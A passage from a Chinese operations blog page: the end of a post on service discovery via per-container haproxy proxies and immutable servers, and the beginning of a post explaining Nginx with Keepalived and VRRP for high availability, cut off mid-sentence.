<li>&#x6269;&#x5BB9;&#x7F29;&#x5BB9;&#x53EF;&#x4EE5;&#x5F88;&#x5BB9;&#x6613;&#x521B;&#x5EFA;&#x548C;&#xFFFD;&#xFFFD;&#xFFFD;&#x6BC1;&#x5BB9;&#x5668;&#xFF0C;&#x4F46;&#x662F;&#x5F15;&#x7528;&#x4E86;&#x8FD9;&#x4E2A;&#x5BB9;&#x5668;&#x7684;&#x670D;&#x52A1;&#x5668;&#x7684;&#x5176;&#x4ED6;&#x5BB9;&#x5668;&#x600E;&#x4E48;&#x529E;&#x5462;&#xFF1F;</li>
<li>&#x53D1;&#x5E03;&#xFF0C;&#x6545;&#x969C;&#x66FF;&#x6362;&#x90FD;&#x662F;&#x540C;&#x6837;&#x7684;&#x95EE;&#x9898;</li>
</ul>
<p>&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x662F;&#x4E24;&#x5F20;&#x56FE;&#xFF1A;</p>
<p><img src="http://img2.tuicool.com/iyAVJjF.png" alt=""></p>
<p><img src="http://img1.tuicool.com/ZfMZNfm.png" alt=""></p>
<p>&#x65B9;&#x6848;&#x5176;&#x5B9E;&#x975E;&#x5E38;&#x7B80;&#x5355;&#x3002;&#x628A; app1 =&gt; app2 &#x7684;&#x7F51;&#x7EDC;&#x8BBF;&#x95EE;&#x5173;&#x7CFB;&#xFF0C;&#x6539;&#x6210; app1 =local=&gt; haproxy =network=&gt; haproxy =local=&gt; app2&#x3002;&#x901A;&#x8FC7;&#x5728;&#x5BB9;&#x5668;&#x672C;&#x5730;&#x90E8;&#x7F72; haproxy &#x201C;&#x6258;&#x7BA1;&#x6240;&#x6709;&#x7684;&#x7AEF;&#x53E3;&#x201D;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7528; haproxy &#x5728;&#x8FDB;&#x7A0B;&#x4E4B;&#x95F4;&#x505A;&#x8054;&#x7EBF;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x6BCF;&#x4E2A;&#x8FDB;&#x7A0B;&#x81EA;&#x5DF1;&#x53BB;&#x8D1F;&#x8D23;&#x8FDE;&#x63A5;&#x7F51;&#x7EDC;&#x4E0A;&#x7684;&#x5176;&#x4ED6;&#x8FDB;&#x7A0B;&#x3002;</p>
<p>&#x8BD5;&#x60F3;&#x4E00;&#x4E0B;&#x4E4B;&#x524D;&#x662F;&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x91CC;&#x786C;&#x7F16;&#x7801; 10.0.0.1:3306 &#x662F;&#x67D0;&#x53F0;&#x6570;&#x636E;&#x5E93;&#x3002;&#x786C;&#x7F16;&#x7801;&#x662F;&#x4E0D;&#x5BF9;&#x7684;&#xFF0C;&#x662F;&#x8981;&#x6253;&#x5C41;&#x80A1;&#x7684;&#x3002;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x628A;&#x786C;&#x7F16;&#x7801;&#x7684; ip &#x5730;&#x5740;&#x6539;&#x6210; 127.0.0.1:10010&#x3002;&#x8FD9;&#x4E00;&#x6B21;&#x6211;&#x4EEC;&#x4E0D;&#x518D;&#x786C;&#x7F16;&#x7801;&#x4EFB;&#x4F55; IP &#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x53EA;&#x786C;&#x7F16;&#x7801;&#x4E00;&#x4E2A;&#x7279;&#x6B8A;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x3002;&#x6BCF;&#x4E2A;&#x8FDB;&#x7A0B;&#x90FD;&#x6709;&#x4E00;&#x5806;&#x7279;&#x6B8A;&#x7684;&#x672C;&#x5730;&#x7AEF;&#x53E3;&#x53F7;&#x7528;&#x4E8E;&#x8BBF;&#x95EE;&#x81EA;&#x5DF1;&#x9700;&#x8981;&#x7684;&#x4E0A;&#x4E0B;&#x6E38;&#x670D;&#x52A1;&#x3002;&#x8FD9;&#x4E2A;&#x7AEF;&#x53E3;&#x53F7;&#x80CC;&#x540E;&#x7684;&#x8FDB;&#x7A0B;&#x5230;&#x5E95;&#x5728;&#x54EA;&#x4E2A; IP&#xFF0C;&#x54EA;&#x4E2A; &#x7AEF;&#x53E3;&#xFF0C;&#x54EA;&#x4E2A; container &#x91CC;&#x6267;&#x884C;&#x3002;&#x505A;&#x4E3A;&#x4F7F;&#x7528;&#x65B9;&#x4E0D;&#x9700;&#x8981;&#x4FEE;&#x6539;&#x4EFB;&#x4F55;&#x4EE3;&#x7801;&#xFF08;&#x6BD4;&#x5982;&#x517C;&#x5BB9;&#x4EC0;&#x4E48; zookeeper/etcd &#x795E;&#x9A6C;&#x7684;&#xFF09;&#xFF0C;&#x4E5F;&#x4E0D;&#x7528;&#x5173;&#x5FC3;&#x3002;&#x751A;&#x81F3;&#x8FD9;&#x4E2A;&#x7AEF;&#x53E3;&#x540E;&#x9762;&#x662F;&#x591A;&#x4E2A;&#x8FDC;&#x7A0B;&#x7684;IP&#x6784;&#x6210;&#x4E00;&#x4E2A;&#x57FA;&#x4E8E;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#x3002;&#x4EE3;&#x7406;&#x751A;&#x81F3;&#x8FD8;&#x53EF;&#x4EE5;&#x505A;&#x4E00;&#x4E9B;&#x51FA;&#x9519;&#x6362;&#x4E00;&#x4E2A;&#x540E;&#x7AEF;&#x518D;&#x91CD;&#x8BD5;&#x7684;&#x4E8B;&#x60C5;&#x3002;</p>
<p>&#x6709;&#x4E86;&#x8FD9;&#x79CD;&#x795E;&#x5668;&#x4E4B;&#x540E;&#xFF0C;&#x6269;&#x5BB9;&#x6240;&#x5BB9;&#xFF0C;&#x53D1;&#x5E03;&#x53D8;&#x66F4;&#xFF0C;&#x6545;&#x969C;&#x66FF;&#x6362;&#x90FD;&#x5F88;&#x8F7B;&#x677E;&#x4E86;&#x3002;&#x5BB9;&#x5668;&#x968F;&#x4FBF;&#x65B0;&#x589E;&#xFF0C;&#x968F;&#x4FBF;&#x5220;&#x9664;&#x3002;&#x7F51;&#x7EDC;&#x7ED3;&#x6784;&#x53D8;&#x5316;&#x4E86;&#x4E4B;&#x540E;&#xFF0C;&#x5237;&#x65B0;&#x5404;&#x4E2A;&#x5730;&#x65B9;&#x7684; haproxy &#x914D;&#x7F6E;&#x5C31;&#x662F;&#x4E86;&#x3002;&#x5404;&#x79CD;&#x7070;&#x5EA6;&#xFF0C;&#x5404;&#x79CD;&#x96F6;&#x505C;&#x673A;&#x66FF;&#x6362;&#x65B9;&#x6848;&#x90FD;&#x53EF;&#x4EE5;&#x641E;&#x8D77;&#x3002;</p>
<h2 id="&#x540D;&#x5B57;&#x670D;&#x52A1;&#x4E0E;&#x7F51;&#x7EDC;">&#x540D;&#x5B57;&#x670D;&#x52A1;&#x4E0E;&#x7F51;&#x7EDC;</h2><p>&#x7C7B;&#x4F3C;&#x7684;&#x65B9;&#x6848;&#x6709;&#x5F88;&#x591A;&#x3002;&#x6700;&#x5E95;&#x5C42;&#x7684;&#x65B9;&#x6848;&#x662F; SDN/IP &#x6F02;&#x79FB;&#xFF0C;&#x4EE5;&#x53CA;&#x7F51;&#x7EDC;&#x7684;bonding&#x3002;&#x8FD9;&#x79CD;&#x65B9;&#x6848;&#x7684;&#x7279;&#x70B9;&#x662F;&#x4FDD;&#x6301; IP &#x5730;&#x5740;&#x4F5C;&#x4E3A;&#x6700;&#x4F20;&#x7EDF;&#x7684;&#x540D;&#x5B57;&#x670D;&#x52A1;&#xFF0C;&#x5984;&#x56FE;&#x5EF6;&#x7EED;&#x5176;&#x751F;&#x547D;&#x3002;</p>
<p>&#x4E0A;&#x5C42;&#x4E00;&#x70B9;&#x7684;&#x65B9;&#x6848;&#x662F; DNS&#x3002;&#x518D;&#x4E0A;&#x5C42;&#x4E00;&#x4E9B;&#x7684;&#x65B9;&#x6848;&#x662F; Zookeeper&#x3002;</p>
<p>&#x5404;&#x79CD;&#x65B9;&#x6848;&#x4E89;&#x7684;&#x5C31;&#x662F;&#x670D;&#x52A1;&#x5982;&#x4F55;&#x6CE8;&#x518C;&#x81EA;&#x5DF1;&#xFF0C;&#x5982;&#x4F55;&#x5F7C;&#x6B64;&#x53D1;&#x73B0;&#x8FD9;&#x4E2A;&#x70B9;&#x3002;&#x5404;&#x79CD;&#x65B9;&#x6848;&#x7684;&#x4F18;&#x7F3A;&#x70B9;&#x53EF;&#x4EE5;&#x81EA;&#x5DF1;&#x53BB;&#x8BFB;&#xFF1A;</p>
<p><a href="http://nerds.airbnb.com/smartstack-service-discovery-cloud/" target="_blank" rel="external">http://nerds.airbnb.com/smartstack-service-discovery-cloud/</a></p>
<p><a href="https://blog.docker.com/tag/smartstack/" target="_blank" rel="external">https://blog.docker.com/tag/smartstack/</a></p>
<p>btw&#xFF0C;airbnb &#x5728; 13 &#x5E74;&#x5C31;&#x628A;&#x8FD9;&#x5957;&#x65B9;&#x6848;&#x6295;&#x5165;&#x751F;&#x4EA7;&#x4E86;&#x3002;</p>
<p>&#x6700;&#x6709;&#x610F;&#x601D;&#x7684;&#x662F;&#x628A;&#x8FD9;&#x79CD; haproxy &#x7684;&#x65B9;&#x6848;&#x4E0E;&#x57FA;&#x4E8E; SDN &#x7684; IP &#x6F02;&#x79FB;&#x65B9;&#x6848;&#x505A;&#x5BF9;&#x6BD4;&#x3002;haproxy &#x7684;&#x5C31;&#x662F;&#x66FF;&#x7F51;&#x7EDC;&#x505A;&#x5E94;&#x7528;&#x5C42;&#x8FDB;&#x7A0B;&#x4E4B;&#x95F4;&#x8054;&#x7EBF;&#x7684;&#x4E8B;&#x60C5;&#xFF0C;&#x901A;&#x8FC7;&#x5F15;&#x5165; haproxy &#x8BA9;&#x8FD9;&#x79CD;&#x8054;&#x7EBF;&#x66F4;&#x5177;&#x6709;&#x7075;&#x6D3B;&#x6027;&#x3002; &#x800C; SDN &#x7684;&#x65B9;&#x6848;&#x662F;&#x8BF4;&#xFF0C;&#x4F60;&#x73B0;&#x5728;&#x7684;&#x4E1A;&#x52A1;&#x8FDB;&#x7A0B;&#x4E4B;&#x95F4;&#x662F;&#x901A;&#x8FC7; IP &#x4E4B;&#x95F4;&#x9759;&#x6001;&#x94FE;&#x63A5;&#x7684;&#xFF0C;&#x8FD9;&#x79CD;&#x8FDE;&#x63A5;&#x4E0D;&#x591F;&#x7075;&#x6D3B;&#x6CA1;&#x5173;&#x7CFB;&#xFF0C;&#x8DEF;&#x7531;&#x5668;&#x5E2E;&#x4F60;&#x6574;&#x3002;&#x4E00;&#x4E2A; IP &#x6302;&#x6389;&#x4E86;&#xFF0C;&#x53EF;&#x4EE5;&#x628A;IP&#x6F02;&#x79FB;&#x5230;&#x53E6;&#x5916;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x4E0A;&#x53BB;&#x7EE7;&#x7EED;&#x4F7F;&#x7528;&#x3002;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x5728;&#x4E00;&#x4E2A;&#x573A;&#x666F;&#x4E0B;&#x5B9E;&#x73B0;&#x4E24;&#x4E2A;&#x8FDB;&#x7A0B;&#x7684;&#x91CD;&#x65B0;&#x8054;&#x7EBF;&#xFF0C;&#x7A81;&#x7834;&#x4E24; IP &#x4E4B;&#x95F4;&#x9759;&#x6001;&#x4E92;&#x8BBF;&#x7684;&#x9650;&#x5236;&#xFF0C;&#x7ED9;&#x57FA;&#x4E8E; IP &#x7684;&#x90E8;&#x7F72;&#x65B9;&#x6848;&#x7EED;&#x547D;&#x3002;</p>
<p>&#x4E24;&#x8005;&#x5E95;&#x5C42;&#x7684;&#x6280;&#x672F;&#x662F;&#x76F8;&#x901A;&#x7684;&#x3002;&#x6240;&#x8C13; IP &#x6F02;&#x79FB;&#x6700;&#x540E;&#x9760;&#x7684;&#x662F;&#x73B0;&#x4EE3;&#x725B;&#x903C;&#x7684;CPU&#xFF0C;&#x548C;&#x8F6F;&#x4EF6;&#x8DEF;&#x7531;&#x6280;&#x672F;&#x3002;&#x6700;&#x540E;&#x73A9;&#x7684;&#x90FD;&#x662F;&#x7528;&#x6237;&#x6001;&#x8F6C;&#x53D1;&#xFF0C;dpdk&#x795E;&#x9A6C;&#x7684;&#x3002;&#x6240;&#x4EE5; haproxy &#x6162;&#xFF0C;&#x8F6C;&#x53D1;&#x6548;&#x7387;&#x6709;&#x95EE;&#x9898;&#x795E;&#x9A6C;&#x7684;&#xFF0C;&#x957F;&#x671F;&#x6765;&#x770B;&#x90FD;&#x4E0D;&#x4F1A;&#x662F;&#x95EE;&#x9898;&#x3002;&#x7528;&#x8F6F;&#x4EF6;&#x6765;&#x8054;&#x7EBF;&#xFF0C;&#x662F;&#x8D8B;&#x52BF;&#x3002;&#x8FDE;&#x8DEF;&#x7531;&#x5668;&#x90FD;&#x5F00;&#x59CB;&#x8FD9;&#x4E48;&#x73A9;&#x4E86;&#xFF0C;&#x8FDE;&#x786C;&#x4EF6;&#x5382;&#x5546;&#x90FD;&#x5F00;&#x59CB;&#x5356;&#x8F6F;&#x4EF6;&#x4E86;&#x3002;</p>
<h2 id="The_Final_Battle">The Final Battle</h2><p>&#x96C6;&#x7FA4;&#x7BA1;&#x7406;&#x7EAF;&#x7CB9;&#x53D8;&#x6210;&#x8FDB;&#x7A0B;&#x7BA1;&#x7406;&#xFF0C;IP&#x4E0D;&#x518D;&#x91CD;&#x8981;&#xFF0C;&#x72B6;&#x6001;&#x4E0D;&#x518D;&#x91CD;&#x8981;&#x3002;CMDB&#x4F1A;&#x53D8;&#x5F97;&#x8D8A;&#x6765;&#x8D8A;&#x8FB9;&#x7F18;&#x5316;&#x3002;</p>
<p>&#x53D1;&#x5E03;&#x53D8;&#x66F4;&#x4E0D;&#x518D;&#x662F;&#x53BB;&#x4FEE;&#x6539;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x800C;&#x662F;&#x65B0;&#x5EFA;&#x9500;&#x6BC1;&#x5BB9;&#x5668;&#xFF0C;&#x4EE5;&#x53CA;&#x66F4;&#x65B0;&#x8FDB;&#x7A0B;&#x95F4;&#x7F51;&#x7EDC;&#x8054;&#x7EBF;&#x5173;&#x7CFB;&#x3002;&#x5206;&#x5E03;&#x5F0F;&#x4F5C;&#x4E1A;&#x7CFB;&#x7EDF;&#x4F1A;&#x8D8A;&#x6765;&#x8D8A;&#x5C11;&#x7528;&#xFF0C;&#x8DF3;&#x677F;&#x673A;&#x5C31;&#x66F4;&#x52A0;&#x4E0D;&#x5141;&#x8BB8;&#x4F7F;&#x7528;&#x4E86;&#x3002;</p>
<p>&#x8BB0;&#x4F4F;&#x201C;immutable servers&#x201D;&#x8FD9;&#x4E2A;&#x63D0;&#x6CD5;&#x5427;&#xFF0C;&#x5B83;&#x7EC8;&#x5C06;&#x4F1A;&#x5F97;&#x5230;&#x5386;&#x53F2;&#x7684;&#x8BA4;&#x53EF;&#x3002;</p>
<p>&#x8D5E;&#x4E00;&#x4E2A; &#x6536; &#x85CF; </p>
<p> &#x63A8;&#x8350;&#x6587;&#x7AE0;</p>
<ul>
<li>1.<a href="/articles/ba6BruI">&#x65E5;&#x5FD7;&#x5206;&#x6790;&#x5DE5;&#x5177;&#xFF1A;&#x6570;&#x636E;&#x4E2D;&#x5FC3;&#x7BA1;&#x7406;&#x7684;&#x65B0;&#x88C5;&#x5907;</a></li>
<li>2.<a href="/articles/ia222y7">&#x5927;&#x578B;&#x7F51;&#x7AD9;&#x67B6;&#x6784;&#x4F53;&#x7CFB;&#x7684;&#x6F14;&#x53D8;&#xFF08;&#x4E0B;&#xFF09;</a></li>
<li>3.<a href="/articles/7vaAfm2">&#x6D45;&#x8C08;&#x89E3;&#x8026;&#x7684;&#x610F;&#x4E49;—-&#x6211;&#x4EEC;&#x4E00;&#x76F4;&#x8FFD;&#x6C42;&#x89E3;&#x8026;&#xFF0C;&#x5374;&#x4E0D;&#x77E5;&#x9053;&#x5979;&#x54EA;&#x91CC;&#x597D;</a></li>
<li>4.<a href="/articles/M3m2eum">&#x5F00;&#x53D1;&#x8005;&#x5E94;&#x8BE5;&#x77E5;&#x9053;&#x7684; OpenStack &#x80CC;&#x540E;&#x7684;&#x8BBE;&#x8BA1;&#x51C6;&#x5219;</a></li>
<li>5.<a href="/articles/MfuAFrq">DaoCloud&#x9080;&#x8BF7;&#x60A8;&#x4F53;&#x9A8C;&#x5168;&#x65B0;&#x6DF7;&#x5408;&#x5F0F;&#x5BB9;&#x5668;&#x4E3B;&#x673A;&#x7BA1;&#x7406;&#x670D;&#x52A1;</a></li>
<li><p>6.<a href="/articles/7ruyEz">&#x4E91;&#x8FDE;&#x9501;&#x53CD;&#x5E94;&#xFF1A;&#x4E2D;&#x95F4;&#x4EF6;&#x6808;&#x6DFB;&#x5C42; &#x5E94;&#x7528;&#x66F4;&#x8F7B;&#x91CF;</a></p>
<p>&#x76F8;&#x5173;&#x5FAE;&#x535A; <a href="/articles/weibo_list/rAveEza">()</a></p>
</li>
</ul>
<h5 id="&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;">&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;</h5><p>&#x9519;&#x8BEF; </p>
<p> &#x767B;&#x5F55;&#x540E;&#x8BC4;&#x8BBA; &#x5DF2;&#x53D1;&#x8868;&#x8BC4;&#x8BBA;&#x6570;( ) </p>
<p>&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x8BC4;&#x8BBA;&#x4E86;^^ </p>
<p>&#x66F4;&#x591A;&#x8BC4;&#x8BBA;</p>
<p>&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#xFF0C;<a href="javascript:reload_comments(&apos;rAveEza&apos;,1,0,-1);" target="_blank" rel="external">&#x91CD;&#x65B0;&#x52A0;&#x8F7D;</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/transcribe/">transcribe</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/运维技术/">运维技术</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2015/06/07/66744d8/" title="Nginx+Keepalived实现站点高可用 -" itemprop="url">Nginx+Keepalived实现站点高可用 -</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="edwin" target="_blank" itemprop="author">edwin</a>
		
  <p class="article-time">
    <time datetime="2015-06-06T22:24:37.000Z" itemprop="datePublished"> 发表于 2015-06-07</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h1 id="Nginx+Keepalived&#x5B9E;&#x73B0;&#x7AD9;&#x70B9;&#x9AD8;&#x53EF;&#x7528;">Nginx+Keepalived&#x5B9E;&#x73B0;&#x7AD9;&#x70B9;&#x9AD8;&#x53EF;&#x7528;</h1><p> &#x65F6;&#x95F4;&#xA0;2015-06-06 23:48:59  <a href="/sites/3uEjYv">segmentfault-&#x535A;&#x5BA2;</a></p>
<p><em>&#x539F;&#x6587;</em>&#xA0; <a href="http://segmentfault.com/a/1190000002881132?utm_source=tuicool" target="_blank" rel="external">http://segmentfault.com/a/1190000002881132</a></p>
<p> &#x4E3B;&#x9898; <a href="/topics/11090041">keepalived</a></p>
<p>&#x516C;&#x53F8;&#x5185;&#x90E8; OA &#x7CFB;&#x7EDF;&#x8981;&#x505A;&#x7EBF;&#x4E0A;&#x9AD8;&#x53EF;&#x7528;&#xFF0C;&#x907F;&#x514D;&#x5355;&#x70B9;&#x6545;&#x969C;&#xFF0C;&#x6240;&#x4EE5;&#x8BA1;&#x5212;&#x4F7F;&#x7528;2&#x53F0;&#x865A;&#x62DF;&#x673A;&#x901A;&#x8FC7; Keepalived &#x5DE5;&#x5177;&#x6765;&#x5B9E;&#x73B0; nginx &#x7684;&#x9AD8;&#x53EF;&#x7528;&#xFF08;High Avaiability&#xFF09;&#xFF0C;&#x8FBE;&#x5230;&#x4E00;&#x53F0;nginx&#x5165;&#x53E3;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#xFF0C;&#x53E6;&#x4E00;&#x53F0;&#x5907;&#x673A;&#x81EA;&#x52A8;&#x63A5;&#x7BA1;&#x670D;&#x52A1;&#x7684;&#x6548;&#x679C;&#x3002;&#xFF08;nginx&#x505A;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#xFF0C;&#x5B9E;&#x73B0;&#x540E;&#x7AEF;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#xFF09;&#x5FEB;&#x901F;&#x642D;&#x5EFA;&#x8BF7;&#x76F4;&#x63A5;&#x8DF3;&#x81F3; &#x7B2C;2&#x8282;&#x3002;</p>
<h2 id="1-_Keepalived&#x4ECB;&#x7ECD;">1. Keepalived&#x4ECB;&#x7ECD;</h2><p>Keepalived&#x662F;&#x4E00;&#x4E2A;&#x57FA;&#x4E8E;VRRP&#x534F;&#x8BAE;&#x6765;&#x5B9E;&#x73B0;&#x7684;&#x670D;&#x52A1;&#x9AD8;&#x53EF;&#x7528;&#x65B9;&#x6848;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x5176;&#x6765;&#x907F;&#x514D;IP&#x5355;&#x70B9;&#x6545;&#x969C;&#xFF0C;&#x7C7B;&#x4F3C;&#x7684;&#x5DE5;&#x5177;&#x8FD8;&#x6709;heartbeat&#x3001;corosync&#x3001;pacemaker&#x3002;&#x4F46;&#x662F;&#x5B83;&#x4E00;&#x822C;&#x4E0D;&#x4F1A;&#x5355;&#x72EC;&#x51FA;&#x73B0;&#xFF0C;&#x800C;&#x662F;&#x4E0E;&#x5176;&#x5B83;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x6280;&#x672F;&#xFF08;&#x5982;lvs&#x3001;haproxy&#x3001;nginx&#xFF09;&#x4E00;&#x8D77;&#x5DE5;&#x4F5C;&#x6765;&#x8FBE;&#x5230;&#x96C6;&#x7FA4;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#x3002;</p>
<h2 id="1-1_VRRP&#x534F;&#x8BAE;">1.1 VRRP&#x534F;&#x8BAE;</h2><p>VRRP&#x5168;&#x79F0; Virtual Router Redundancy Protocol&#xFF0C;&#x5373; <a href="http://en.wikipedia.org/wiki/VRRP" target="_blank" rel="external">&#x865A;&#x62DF;&#x8DEF;&#x7531;&#x5197;&#x4F59;&#x534F;&#x8BAE;</a> &#x3002;&#x53EF;&#x4EE5;&#x8BA4;&#x4E3A;&#x5B83;&#x662F;&#x5B9E;&#x73B0;&#x8DEF;&#x7531;&#x5668;&#x9AD8;&#x53EF;&#x7528;&#x7684;&#x5BB9;&#x9519;&#x534F;&#x8BAE;&#xFF0C;&#x5373;&#x5C06;N&#x53F0;&#x63D0;&#x4F9B;&#x76F8;&#x540C;&#x529F;&#x80FD;&#x7684;&#x8DEF;&#x7531;&#x5668;&#x7EC4;&#x6210;&#x4E00;&#x4E2A;&#x8DEF;&#x7531;&#x5668;&#x7EC4;(Router Group)&#xFF0C;&#x8FD9;&#x4E2A;&#x7EC4;&#x91CC;&#x9762;&#x6709;&#x4E00;&#x4E2A;master&#x548C;&#x591A;&#x4E2A;backup&#xFF0C;&#x4F46;&#x5728;&#x5916;&#x754C;&#x770B;&#x6765;&#x5C31;&#x50CF;&#x4E00;&#x53F0;&#x4E00;&#x6837;&#xFF0C;&#x6784;&#x6210;&#x865A;&#x62DF;&#x8DEF;&#x7531;&#x5668;&#xFF0C;&#x62E5;&#x6709;&#x4E00;&#x4E2A;&#x865A;&#x62DF;IP&#xFF08;vip&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8DEF;&#x7531;&#x5668;&#x6240;&#x5728;&#x5C40;&#x57DF;&#x7F51;&#x5185;&#x5176;&#x4ED6;&#x673A;&#x5668;&#x7684;&#x9ED8;&#x8BA4;&#x8DEF;&#x7531;&#xFF09;&#xFF0C;&#x5360;&#x6709;&#x8FD9;&#x4E2A;IP&#x7684;master&#x5B9E;&#x9645;&#x8D1F;&#x8D23;ARP&#x76F8;&#x5E94;&#x548C;&#x8F6C;&#x53D1;IP&#x6570;&#x636E;&#x5305;&#xFF0C;&#x7EC4;&#x4E2D;&#x7684;&#x5176;&#x5B83;&#x8DEF;&#x7531;&#x5668;&#x4F5C;&#x4E3A;&#x5907;&#x4EFD;&#x7684;&#x89D2;&#x8272;&#x5904;&#x4E8E;&#x5F85;&#x547D;&#x72B6;&#x6001;&#x3002;master&#x4F1A;&#x53D1;&#x7EC4;&#x64AD;&#x6D88;&#x606F;&#xFF0C;&#x5F53;backup&#x5728;&#x8D85;&#x65F6;&#x65F6;&#x95F4;&#x5185;&#x6536;&#x4E0D;&#x5230;vrrp&#x5305;&#x65F6;&#x5C31;&#x8BA4;&#x4E3A;master&#x5B95;&#x6389;&#x4E86;&#xFF0C;&#x8FD9;&#x65F6;&#x5C31;&#x9700;&#x8981;&#x6839;&#x636E;VRRP&#x7684;&#x4F18;&#x5148;&#x7EA7;&#x6765;&#x9009;&#x4E3E;&#x4E00;&#x4E2A;backup&#x5F53;master&#xFF0C;&#x4FDD;&#x8BC1;&#x8DEF;&#x7531;&#x5668;&#x7684;&#x9AD8;&#xFFFD;&#xFFFD;&#xFFFD;&#x7528;&#x3002; </p>
<p>&#x5728;VRRP&#x534F;&#x8BAE;&#x5B9E;&#x73B0;&#x91CC;&#xFF0C;&#x865A;&#x62DF;&#x8DEF;&#x7531;&#x5668;&#x4F7F;&#x7528; 00-00-5E-00-01-XX &#x4F5C;&#x4E3A; <em>&#x865A;&#x62DF;</em> MAC&#x5730;&#x5740;&#xFF0C;XX&#x5C31;&#x662F;&#x552F;&#x4E00;&#x7684; VRID &#xFF08;Virtual Router IDentifier&#xFF09;&#xFF0C;&#x8FD9;&#x4E2A;&#x5730;&#x5740;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x7269;&#x7406;&#x8DEF;&#x7531;&#x5668;&#x5360;&#x7528;&#x3002;&#x5728;&#x865A;&#x62DF;&#x8DEF;&#x7531;&#x5668;&#x91CC;&#x9762;&#x7684;&#x7269;&#x7406;&#x8DEF;&#x7531;&#x5668;&#x7EC4;&#x91CC;&#x9762;&#x901A;&#x8FC7;&#x591A;&#x64AD;IP&#x5730;&#x5740; 224.0.0.18 &#x6765;&#x5B9A;&#x65F6;&#x53D1;&#x9001;&#x901A;&#x544A;&#x6D88;&#x606F;&#x3002;&#x6BCF;&#x4E2A;Router&#x90FD;&#x6709;&#x4E00;&#x4E2A; 1-255 &#x4E4B;&#x95F4;&#x7684;&#x4F18;&#x5148;&#x7EA7;&#x522B;&#xFF0C;&#x7EA7;&#x522B;&#x6700;&#x9AD8;&#x7684;&#xFF08;highest priority&#xFF09;&#x5C06;&#x6210;&#x4E3A;&#x4E3B;&#x63A7;&#xFF08;master&#xFF09;&#x8DEF;&#x7531;&#x5668;&#x3002;&#x901A;&#x8FC7;&#x964D;&#x4F4E;master&#x7684;&#x4F18;&#x5148;&#x6743;&#x53EF;&#x4EE5;&#x8BA9;&#x5904;&#x4E8E;backup&#x72B6;&#x6001;&#x7684;&#x8DEF;&#x7531;&#x5668;&#x62A2;&#x5360;&#xFF08;pro-empt&#xFF09;&#x4E3B;&#x8DEF;&#x7531;&#x5668;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x4E24;&#x4E2A;backup&#x4F18;&#x5148;&#x7EA7;&#x76F8;&#x540C;&#x7684;IP&#x5730;&#x5740;&#x8F83;&#x5927;&#x8005;&#x4E3A;master&#xFF0C;&#x63A5;&#x7BA1;&#x865A;&#x62DF;IP&#x3002; </p>
<p><img src="http://img2.tuicool.com/2qEnqm.jpg" alt=""></p>
<h3 id="&#x4E0E;heartbeat/corosync&#x7B49;&#x6BD4;&#x8F83;">&#x4E0E;heartbeat/corosync&#x7B49;&#x6BD4;&#x8F83;</h3><p>&#x76F4;&#x63A5;&#x6458;&#x6284;&#x81EA; <a href="http://www.linuxidc.com/Linux/2013-08/89227.htm" target="_blank" rel="external">http://www.linuxidc.com/Linux/2013-08/89227.htm</a> &#xFF1A; </p>
<p>Heartbeat&#x3001;Corosync&#x3001;Keepalived&#x8FD9;&#x4E09;&#x4E2A;&#x96C6;&#x7FA4;&#x7EC4;&#x4EF6;&#x6211;&#x4EEC;&#x5230;&#x5E95;&#x9009;&#x54EA;&#x4E2A;&#x597D;&#xFF0C;&#x9996;&#x5148;&#x6211;&#x60F3;&#x8BF4;&#x660E;&#x7684;&#x662F;&#xFF0C;Heartbeat&#x3001;Corosync&#x662F;&#x5C5E;&#x4E8E;&#x540C;&#x4E00;&#x7C7B;&#x578B;&#xFF0C;Keepalived&#x4E0E;Heartbeat&#x3001;Corosync&#xFF0C;&#x6839;&#x672C;&#x4E0D;&#x662F;&#x540C;&#x4E00;&#x7C7B;&#x578B;&#x7684;&#x3002;Keepalived&#x4F7F;&#x7528;&#x7684;vrrp&#x534F;&#x8BAE;&#x65B9;&#x5F0F;&#xFF0C;&#x865A;&#x62DF;&#x8DEF;&#x7531;&#x5197;&#x4F59;&#x534F;&#x8BAE; (Virtual Router Redundancy 